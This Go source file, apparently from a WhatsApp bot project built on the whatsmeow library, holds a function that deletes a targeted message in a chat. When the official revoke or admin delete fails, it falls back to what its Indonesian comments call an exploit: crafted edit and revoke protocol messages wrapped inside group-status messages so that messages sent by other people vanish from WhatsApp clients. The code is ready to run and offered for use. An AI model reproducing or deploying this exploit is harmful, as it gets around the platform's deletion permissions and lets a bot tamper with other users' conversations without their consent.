package messaging

import (
	"context"
	"fmt"
	"time"

	protocol "github.com/hanzywaifu-coder/dongtube-meowbail/internal/protocol"
	"go.mau.fi/whatsmeow/proto/waCommon"
	"go.mau.fi/whatsmeow/proto/waE2E"
	"google.golang.org/protobuf/proto"
)

// DeleteMessageGlitch memanfaatkan kombinasi GroupStatusMessageV2 & ProtocolMessage MESSAGE_EDIT (type 14)
// untuk menghilangkan pesan yang di-reply pada client WhatsApp.
func DeleteMessageGlitch(c *protocol.Client, ctx context.Context, chat protocol.JID, targetID protocol.MessageID, targetSender protocol.JID, fromMe bool) error {
	if targetID == "" {
		return fmt.Errorf("target message ID kosong")
	}

	participantStr := ""
	if !targetSender.IsEmpty() {
		participantStr = targetSender.ToNonAD().String()
	}

	key := &waCommon.MessageKey{
		RemoteJID: proto.String(chat.String()),
		FromMe:    proto.Bool(fromMe),
		ID:        proto.String(string(targetID)),
	}
	if participantStr != "" {
		key.Participant = proto.String(participantStr)
	}

	// 1. Coba cara resmi jika pesan dikirim oleh bot sendiri atau bot admin grup
	if fromMe {
		_, err := c.RevokeMessage(ctx, chat, targetID)
		if err == nil {
			return nil
		}
	} else {
		// Jika bot adalah admin grup, coba revoke resmi sebagai admin (Admin Delete)
		revokeMsg := c.BuildRevoke(chat, targetSender, targetID)
		_, err := c.SendMessage(ctx, chat, revokeMsg)
		if err == nil {
			return nil
		}
	}

	// 2. Exploit SWGC + ProtocolMessage MESSAGE_EDIT (Type 14)
	protoType := waE2E.ProtocolMessage_MESSAGE_EDIT
	protoMsg := &waE2E.ProtocolMessage{
		Key:         key,
		Type:        &protoType,
		TimestampMS: proto.Int64(time.Now().UnixMilli()),
	}

	glitchMsg := &waE2E.Message{
		GroupStatusMessageV2: &waE2E.FutureProofMessage{
			Message: &waE2E.Message{
				ProtocolMessage: protoMsg,
			},
		},
	}
	_, err := c.SendMessage(ctx, chat, glitchMsg)
	if err != nil {
		return err
	}

	// 3. Exploit SWGC + ProtocolMessage REVOKE (Type 0)
	revokeType := waE2E.ProtocolMessage_REVOKE
	protoRevokeMsg := &waE2E.ProtocolMessage{
		Key:         key,
		Type:        &revokeType,
		TimestampMS: proto.Int64(time.Now().UnixMilli()),
	}
	glitchRevokeMsg := &waE2E.Message{
		GroupStatusMessageV2: &waE2E.FutureProofMessage{
			Message: &waE2E.Message{
				ProtocolMessage: protoRevokeMsg,
			},
		},
	}
	_, _ = c.SendMessage(ctx, chat, glitchRevokeMsg)

	return nil
}
